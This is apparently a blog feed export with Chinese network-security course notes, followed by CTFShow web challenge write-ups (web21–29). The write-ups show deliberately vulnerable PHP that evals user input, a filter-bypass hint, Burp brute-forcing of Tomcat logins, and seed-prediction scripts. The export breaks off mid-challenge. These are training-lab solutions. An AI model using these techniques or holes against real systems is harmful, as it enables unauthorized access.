id="1、类型">1、类型</h3><ol><li><p>被动攻击（指监测和收集网络中传输的信息）</p></li><li><p>主动攻击（典型的网络外部的攻击）</p><p>手段：</p><ol><li>对可用网络带宽的攻击<ol><li>拒绝服务攻击</li><li>服务的窃取攻击是有效带宽攻击中危害较轻的一种</li></ol></li><li>对网络管理通信的破坏攻击</li><li>使用网络基础设施失控的攻击<ol><li>针对网络操作员和设备之间通信的攻击</li><li>直接针对网络设备的网络控制攻击</li><li>针对NMC的攻击</li></ol></li></ol></li><li><p>内部人员攻击（此时的内部人员指有意或无意造成通信网可用性降低的用户或网管操作员）</p></li><li><p>分发攻击（分发攻击是通过改变供应商提供的软件和硬件，从而实现攻击网络的目的。）</p></li></ol><h2 id="二、安全威胁有哪些？">二、安全威胁有哪些？</h2><ol><li>可用带宽损耗</li><li>网络管理通信的破坏</li><li>网络基础设施失去管理</li></ol><h2 id="三、安全操作系统主要的安全技术有哪些？">三、安全操作系统主要的安全技术有哪些？</h2><ol><li>身份鉴别</li><li>标识</li><li>审计</li><li>自主访问控制</li><li>强制访问控制</li><li>客体重用</li><li>可信路径</li><li>隐蔽通道分析</li><li>形式化分析与验证</li></ol><h2 id="四、安全要求有哪些？">四、安全要求有哪些？</h2><ol><li>访问控制</li><li>鉴别</li><li>可用性</li><li>保密性</li><li>完整性</li><li>不可否认性</li></ol><h1>第五章</h1><h2 id="一、中国可信计算革命性创新？">一、中国可信计算革命性创新？</h2><ol><li>全新的可信计算体系架构</li><li>跨越了国际可信计算组织（TCG）可信计算的局限性<ol><li>密码体制的局限性</li><li>体系结构的不合理</li></ol></li><li>创新可信密码体系</li><li>创建主动免疫体系结构</li><li>开创可信计算3.0新时代</li></ol><h1>第六章</h1><h2 id="一、了解等级保护的对象有哪些？">一、了解等级保护的对象有哪些？</h2><p><strong>网络安全等级保护对象主要包括：网络基础设施、信息系统、大数据、云计算平台、物联网、工控系统等。</strong></p><h2 id="二、进行等级保护的工作流程有哪些？">二、进行等级保护的工作流程有哪些？</h2><p><strong>定级、备案、建设整改、等级测评、监督检查</strong></p><h1>第七章</h1><h2 id="一、信息系统生命周期的几个阶段？">一、信息系统生命周期的几个阶段？</h2><p><strong>五个基础阶段：规划、设计、实施、运维和废弃</strong></p><h2 id="二、信息化工程中的安全建设原则有哪些？">二、信息化工程中的安全建设原则有哪些？</h2><ol><li>同步原则</li><li>问题和解决方案相区分原则</li><li>安全风险和成本相平衡原则</li><li>纵深防御原则</li><li>管理与技术并重原则</li><li>简单化原则</li><li>应急灾备原则</li></ol><h2 id="三、风险计算的公式，每个符号代表什么？">三、风险计算的公式，每个符号代表什么？</h2><p><strong>计算原理：风险值=R(A,T,V)=R(L(T,V),F(Ia,Va))</strong></p><p><strong>符号代表：A 表示资产；T 表示威胁；V 表示脆弱性；Ia 表示安全事件所作用的资产价值；Va 表示脆弱性严重程度；L 表示威胁利用资产的脆弱性导致安全事件的可能性；F 表示安全事件发生后造成的损失</strong></p><p><strong>安全事件的可能性=L(威胁出现的频率，脆弱性)=L(T,V)</strong></p><p><strong>安全事件造成的损失=F(资产价值，脆弱性严重程度)=F(Ia,Va)</strong></p><p><strong>风险值=R(安全事件的可能性，安全事件造成的损失)=R(L(T,V),F(Ia,Va))</strong></p><h1>第八章</h1><h2 id="一、实现攻击的具体步骤有哪些？">一、实现攻击的具体步骤有哪些？</h2><ol><li>确定目标</li><li>获取控制权</li><li>权限提升与保持</li><li>实施攻击</li><li>消除痕迹</li></ol><h2 id="二、网络攻击分类">二、网络攻击分类</h2><h3 id="1、根据攻击的效果">1、根据攻击的效果</h3><ol><li>主动攻击<ol><li>篡改</li><li>伪造</li><li>拒绝服务</li></ol></li><li>被动攻击<ol><li>窃听</li><li>流量分析</li></ol></li></ol><h3 id="2、根据攻击的技术特点">2、根据攻击的技术特点</h3><ol><li><p>基于网络协议的攻击</p><ol><li>针对数据链路层的攻击，如：ARP欺骗</li><li>针对网络层的攻击，如：Smurf攻击，ICMP路由欺骗</li><li>针对传输层的攻击，如：SYN洪水攻击，会话劫持</li><li>针对应用层的攻击，如：DNS欺骗和窃取</li></ol></li><li><p>基于系统安全漏洞的攻击</p><p><strong>基于系统安全漏洞的攻击包括针对操作系统漏洞的攻击、针对IE漏洞的攻击、针对IIS.</strong><br><strong>漏洞的攻击、针对Web应用漏洞的攻击，后文对此有详述,</strong></p></li></ol><h3 id="3、根据攻击的位置">3、根据攻击的位置</h3><ol><li>远程攻击</li><li>本地攻击</li><li>伪造远程攻击</li></ol><h2 id="三、网络攻击的方法">三、网络攻击的方法</h2><ol><li>口令猜解</li><li>木马</li><li>拒绝服务</li><li>漏洞攻击</li><li>网络钓鱼</li><li>社会工程</li><li>后门攻击</li><li>高级持续攻击</li></ol><h2 id="四、网络攻击的防范策略">四、网络攻击的防范策略</h2><ol><li>有效使用各类安全技术，筑牢安全防线</li><li>提升安全意识，加强安全管理</li><li>强化溯源取证和打击能力，形成威慑</li></ol><h2 id="五、网络安全事件分类">五、网络安全事件分类</h2><h3 id="1、有害程序事件">1、有害程序事件</h3><ol><li>计算机病毒事件是指蓄意制造、传播计算机病毒，或是因受到计算机病毒影响而导致的网络安全事件</li><li>蠕虫事件是指蓄意制造、传播蠕虫，或是受到蠕虫影响而导致的网络安全事件</li><li>特洛伊木马事件是指蓄意制造、传播特洛伊木马程序，或是因受到特洛伊木马程序影响而导致的网络安全事件</li><li>僵尸网络事件是指利用僵尸工具软件，形成僵尸网络而导致的网络安全事件</li><li>混合攻击程序事件是指蓄意制造、传播混合攻击程序，或是因受到混合攻击程序影响而导致的网络安全事件</li><li>网页内嵌恶意代码事件是指蓄意制造、传播网页内嵌恶意代码，或是因受到网页内嵌恶意代码影响而导致的网络安全事件</li><li>其他有害程序事件是指不能包含在以上6个子类中的有害程序事件</li></ol><h3 id="2、网络攻击事件">2、网络攻击事件</h3><p><strong>拒绝服务攻击事件、后门攻击事件、漏洞攻击事件、网络扫描窃听事件、网络钓鱼事件、干扰事件和其他网络攻击事件7个子类</strong></p><h3 id="3、信息破坏事件">3、信息破坏事件</h3><p><strong>信息篡改事件、信息假冒事件、信息泄露事件、信息窃取事件、信息丢失事件和其他信息破坏与假冒事件6个子类</strong></p><h3 id="4、信息内容安全事件">4、信息内容安全事件</h3><ol><li>违反宪法和法律、行政法规的网络安全事件</li><li>针对社会事项进行讨论、评论形成网上敏感的舆论热点，出现一定规模炒作的网络<br>安全事件。</li><li>组织串联煽动集会游行的网络安全事件。</li><li>其他信息内容安全事件。</li></ol><h3 id="5、设备设施故障">5、设备设施故障</h3><p><strong>设备设施故障包括软、硬件自身故障、外围保障设施故障、人为破坏事故和其他设备设<br>施故障4个子类</strong></p><h3 id="6、灾害性事件">6、灾害性事件</h3><p><strong>灾害性事件是指由于不可抗力对信息系统造成物理破坏而导致的网络安全事件。灾害性<br>事件包括水灾、台风、地震、雷击、坍塌、火灾、恐怖袭击、战争等导致的网络安全事件。</strong></p><h3 id="7、其他网络安全事件">7、其他网络安全事件</h3><p><strong>其他网络安全事件类别是指不能归为以上6个基本分类的网络安全事件。</strong></p><h1>第九章</h1><h2 id="一、云计算的主要特征">一、云计算的主要特征</h2><ol><li>按需服务</li><li>虚拟化</li><li>资源池化</li><li>快速方便</li><li>服务可计量</li></ol><h2 id="二、云计算面临新的安全风险有哪些？">二、云计算面临新的安全风险有哪些？</h2><ol><li>客户对数据和业务系统的控制能力减弱</li><li>客户与云计算服务提供商之间的网络安全责任难以界定</li><li>可能产生司法管辖权错位问题</li><li>客户对数据所有权很难保障</li><li>客户数据的安全保护更加困难</li><li>客户数据残留风险</li><li>容易产生对云服务商的过度依赖</li></ol><h2 id="三、物联网的关键技术？">三、物联网的关键技术？</h2><ol><li>传感网技术</li><li>射频识别技术</li><li>M2M技术</li><li>云计算和大数据技术</li></ol><h2 id="四、物联网的安全风险？">四、物联网的安全风险？</h2><h3 id="1、物联网系统中需要保护的对象">1、物联网系统中需要保护的对象</h3><ol><li>人员</li><li>个人隐私</li><li>通信通道</li><li>末端设备</li><li>中间设备</li><li>后台设备</li><li>基础设施服务</li><li>全局系统/设施</li></ol><h3 id="2、物联网面临的主要安全风险">2、物联网面临的主要安全风险</h3><ol><li><p>身份欺诈（物联网系统中，身份欺诈就是一个用户非法使用另 - .个用户的身份。这种攻击的实施通</p><p>常需要利用系统中的各种标识符，包括人员、设备.通信流等。）</p></li><li><p>数据篡改（数据篡改就是攻击者试图修改物联网系统中交互数据内容的行为。很多情况下，攻击者</p><p>只对物联网系统中原始数据进行微小改动.就可触发数据接受者的某些特定行为。达到攻击效果。）</p></li><li><p>抵赖（抵赖是指一个攻击者在物联网系统中实施了非法活动或攻击行为，但事后拒绝承认其实施了非法活动或攻击行为，而系统中没有安全防护措施证明该攻击者的恶意行为。）</p></li><li><p>信息泄露（信息泄露是指物联网系统中信息泄露给了非授权用户。在一些物联网应用授权模型中，可能有一大批用户会被授权能够访问同-信息，这将导致在某些特定条件下信息泄露情况的发生。）</p></li><li><p>拒绝服务（拒绝服务攻击是指导致物联网系统中合法用户不能继续使用某一服务的行为。某些情况<br>下，攻击者可能细微调整拒绝服务攻击进而达到攻击效果，此时尽管用户还可以使用某–服<br>务，但是用户无法得到所期望的服务结果。）</p></li><li><p>权限提升（权限升级通常发生在定义了不同权限用户组的物联网系统中。攻击者通过各种手段和方<br>法获得更高的权限(多数情况是获得整个系统的管理员权限)，然后对访问对象实施任意行<br>为。这可能破坏系统，甚至完全改变系统的行为。）</p></li></ol><h1>第十章</h1><h2 id="一、法律的作用有哪些？">一、法律的作用有哪些？</h2><ol><li>指引作用：指法对本人的行为具有引导的作用。</li><li>评价作用：法律作为一种行为标准，具有判断、衡量他人行为合法与否的评判作用。</li><li>教育作用：指通过法的实施使法律对- -般人的行为产生影响。这种作用又具体表<br>现为示警作用和示范作用。</li><li>预测作用：凭借法律的存在，可以预先估计到人们相互之间会如何行为。</li><li>强制作用：指法可以通过制裁违法犯罪行为来强制人们遵守法律。</li></ol><h2 id="二、主要网络安全法律">二、主要网络安全法律</h2><ol><li>中华人民共和国宪法:</li><li>中华人民共和国网络安全法;</li><li>中华人民共和国保守国家秘密法;</li><li>中华人民共和国国家安全法;</li><li>中华人民共和国刑法;</li><li>中华人民共和国治安管理处罚法;</li><li>中华人民共和国电子签名法;</li><li>全国人民代表大会常务委员会关于维护互联网安全的决定;</li><li>全国人民代表大会关于加强网络信息保护的决定。</li></ol><h2 id="三、主要网络安全行政法规">三、主要网络安全行政法规</h2><ol><li>中华人民共和国计算机信息系统安全保护条例;</li><li>中华人民共和国计算机信息网络国际联网管理暂行规定;</li><li>商用密码管理条例;</li><li>中华人民共和国电信条例;</li><li>互联网信息服务管理办法;</li><li>互联网上网服务营业场所管理条例;</li><li>信息网络传播权保护条例。</li></ol>]]></content>
      
      
      <categories>
          
          <category> 学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 学习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTFShow-web-命令执行</title>
      <link href="/posts/41279/"/>
      <url>/posts/41279/</url>
      
        <content type="html"><![CDATA[<h1>web29</h1><p>源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-09-04 00:12:34</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-09-04 00:26:48</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>分析源码得知过滤了字符串<strong>flag</strong></p><p>system(“ls”)命令执行成功，然后就是要绕过获取flag</p><p><img src="https://alpha-blog-image.oss-cn-shenzhen.aliyuncs.com/image/image-20221029223449049.png" alt=""></p><p>通过字符串拼接的方法进行绕过</p>]]></content>
      
      
      <categories>
          
          <category> CTFshow </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTFshow-web21-28</title>
      <link href="/posts/42189/"/>
      <url>/posts/42189/</url>
      
        <content type="html"><![CDATA[<h2 id="web21">web21</h2><ul><li>题目：</li></ul><p><img src="https://alpha-blog-image.oss-cn-shenzhen.aliyuncs.com/image/image-20221013094816541.png" alt="image-20221013094816541"></p><ul><li>burp抓包利用Intruder模块进行爆破，在根据hint1里的提示知道这是一个tomcat认证爆破，所以标记Authorization: Basic</li></ul><p><img src="https://alpha-blog-image.oss-cn-shenzhen.aliyuncs.com/image/image-20221013094825370.png" alt="image-20221013094825370"></p><ul><li>Authorization字段后面的值经过了base64的加密，所以爆破时也要进行相应的加密</li></ul><p><img src="https://alpha-blog-image.oss-cn-shenzhen.aliyuncs.com/image/image-20221013094832859.png" alt="image-20221013094832859"></p><ul><li>Payload sets的设置，字典利用题目给的附件，用户名猜一手admin，最后也是证明猜对了</li></ul><p><img src="https://alpha-blog-image.oss-cn-shenzhen.aliyuncs.com/image/image-20221013094839110.png" alt="image-20221013094839110"></p><h2 id="web22">web22</h2><ul><li>域名失效了做不了</li></ul><p><img src="https://alpha-blog-image.oss-cn-shenzhen.aliyuncs.com/image/image-20221013094848348.png" alt="image-20221013094848348"></p><h2 id="web23">web23</h2><ul><li>题目：</li></ul><p><img src="https://alpha-blog-image.oss-cn-shenzhen.aliyuncs.com/image/image-20221013094856686.png" alt="image-20221013094856686"></p><ul><li>源码：</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-09-03 11:43:51</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-09-03 11:56:11</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;token&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$token</span> = <span class="title function_ invoke__">md5</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;token&#x27;</span>]);</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">substr</span>(<span class="variable">$token</span>, <span class="number">1</span>,<span class="number">1</span>)===<span class="title function_ invoke__">substr</span>(<span class="variable">$token</span>, <span class="number">14</span>,<span class="number">1</span>) &amp;&amp; <span class="title function_ invoke__">substr</span>(<span class="variable">$token</span>, <span class="number">14</span>,<span class="number">1</span>) ===<span class="title function_ invoke__">substr</span>(<span class="variable">$token</span>, <span class="number">17</span>,<span class="number">1</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>((<span class="title function_ invoke__">intval</span>(<span class="title function_ invoke__">substr</span>(<span class="variable">$token</span>, <span class="number">1</span>,<span class="number">1</span>))+<span class="title function_ invoke__">intval</span>(<span class="title function_ invoke__">substr</span>(<span class="variable">$token</span>, <span class="number">14</span>,<span class="number">1</span>))+<span class="title function_ invoke__">substr</span>(<span class="variable">$token</span>, <span class="number">17</span>,<span class="number">1</span>))/<span class="title function_ invoke__">substr</span>(<span class="variable">$token</span>, <span class="number">1</span>,<span class="number">1</span>)===<span class="title function_ invoke__">intval</span>(<span class="title function_ invoke__">substr</span>(<span class="variable">$token</span>, <span class="number">31</span>,<span class="number">1</span>)))&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><ul><li>分析源码编写php脚本：</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">0</span>;<span class="variable">$i</span>&lt;<span class="number">10000</span>;<span class="variable">$i</span>++) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$token</span> = <span class="title function_ invoke__">md5</span>(<span class="variable">$i</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">substr</span>(<span class="variable">$token</span>, <span class="number">1</span>, <span class="number">1</span>) === <span class="title function_ invoke__">substr</span>(<span class="variable">$token</span>, <span class="number">14</span>, <span class="number">1</span>) &amp;&amp; <span class="title function_ invoke__">substr</span>(<span class="variable">$token</span>, <span class="number">14</span>, <span class="number">1</span>) === <span class="title function_ invoke__">substr</span>(<span class="variable">$token</span>, <span class="number">17</span>, <span class="number">1</span>)) &#123;</span><br><span class="line">        <span class="keyword">if</span> ((<span class="title function_ invoke__">intval</span>(<span class="title function_ invoke__">substr</span>(<span class="variable">$token</span>, <span class="number">1</span>, <span class="number">1</span>)) + <span class="title function_ invoke__">intval</span>(<span class="title function_ invoke__">substr</span>(<span class="variable">$token</span>, <span class="number">14</span>, <span class="number">1</span>)) + <span class="title function_ invoke__">substr</span>(<span class="variable">$token</span>, <span class="number">17</span>, <span class="number">1</span>)) / <span class="title function_ invoke__">substr</span>(<span class="variable">$token</span>, <span class="number">1</span>, <span class="number">1</span>) === <span class="title function_ invoke__">intval</span>(<span class="title function_ invoke__">substr</span>(<span class="variable">$token</span>, <span class="number">31</span>, <span class="number">1</span>)))&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;token&#x27;</span>.<span class="variable">$i</span>.<span class="string">&#x27;md5&#x27;</span>.<span class="variable">$token</span>;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><ul><li>flag</li></ul><p><img src="https://alpha-blog-image.oss-cn-shenzhen.aliyuncs.com/image/image-20221013094908217.png" alt="image-20221013094908217"></p><h2 id="web24">web24</h2><ul><li>源码：</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-09-03 13:26:39</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-09-03 13:53:31</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;r&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$r</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;r&#x27;</span>];</span><br><span class="line">    <span class="title function_ invoke__">mt_srand</span>(<span class="number">372619038</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">intval</span>(<span class="variable">$r</span>)===<span class="title function_ invoke__">intval</span>(<span class="title function_ invoke__">mt_rand</span>()))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">system</span>(<span class="string">&#x27;cat /proc/version&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span> Linux version <span class="number">5.4</span>.<span class="number">0</span>-<span class="number">126</span>-<span class="title function_ invoke__">generic</span> (buildd@lcy02-amd64-<span class="number">072</span>) (gcc version <span class="number">9.4</span>.<span class="number">0</span> (Ubuntu <span class="number">9.4</span>.<span class="number">0</span>-<span class="number">1</span>ubuntu1~<span class="number">20.04</span>.<span class="number">1</span>)) <span class="comment">#142-Ubuntu SMP Fri Aug 26 12:12:57 UTC 2022 Linux version 5.4.0-126-generic (buildd@lcy02-amd64-072) (gcc version 9.4.0 (Ubuntu 9.4.0-1ubuntu1~20.04.1)) #142-Ubuntu SMP Fri Aug 26 12:12:57 UTC 2022</span></span><br></pre></td></tr></table></figure><ul><li>hint</li></ul><p><img src="https://alpha-blog-image.oss-cn-shenzhen.aliyuncs.com/image/image-20221013100000106.png" alt="image-20221013100000106"></p><ul><li>根据hint写php脚本</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">mt_srand</span>(<span class="number">372619038</span>);</span><br><span class="line"><span class="keyword">echo</span> (<span class="title function_ invoke__">mt_rand</span>());</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><ul><li>flag</li></ul><p><img src="https://alpha-blog-image.oss-cn-shenzhen.aliyuncs.com/image/image-20221013100143229.png" alt="image-20221013100143229"></p><h2 id="web25">web25</h2><ul><li>源码：</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-09-03 13:56:57</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-09-03 15:47:33</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;r&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$r</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;r&#x27;</span>];</span><br><span class="line">    <span class="title function_ invoke__">mt_srand</span>(<span class="title function_ invoke__">hexdec</span>(<span class="title function_ invoke__">substr</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$flag</span>), <span class="number">0</span>,<span class="number">8</span>)));</span><br><span class="line">    <span class="variable">$rand</span> = <span class="title function_ invoke__">intval</span>(<span class="variable">$r</span>)-<span class="title function_ invoke__">intval</span>(<span class="title function_ invoke__">mt_rand</span>());</span><br><span class="line">    <span class="keyword">if</span>((!<span class="variable">$rand</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;token&#x27;</span>]==(<span class="title function_ invoke__">mt_rand</span>()+<span class="title function_ invoke__">mt_rand</span>()))&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$rand</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">system</span>(<span class="string">&#x27;cat /proc/version&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line">Linux version <span class="number">5.4</span>.<span class="number">0</span>-<span class="number">126</span>-<span class="title function_ invoke__">generic</span> (buildd@lcy02-amd64-<span class="number">072</span>) (gcc version <span class="number">9.4</span>.<span class="number">0</span> (Ubuntu <span class="number">9.4</span>.<span class="number">0</span>-<span class="number">1</span>ubuntu1~<span class="number">20.04</span>.<span class="number">1</span>)) <span class="comment">#142-Ubuntu SMP Fri Aug 26 12:12:57 